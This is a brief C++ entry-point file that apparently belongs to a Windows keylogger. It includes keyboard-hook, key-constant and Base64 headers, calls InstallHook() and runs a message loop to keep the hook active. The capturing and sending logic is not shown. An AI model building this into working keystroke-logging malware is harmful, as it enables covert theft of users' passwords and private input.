#include <iostream>
#include <windows.h>
#include "Helper.h"
#include "KeyConstants.h"
#include "Base64.h"
#include "KeybHook.h"



int main() {

    MSG msg;
    InstallHook();
    while(GetMessageW(&msg, NULL, 0,0 )){
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    /*
    int ch;
    std::cout << "fdasfsas" << std::endl;
    scanf("%d",&ch);*/
    return 0;
}
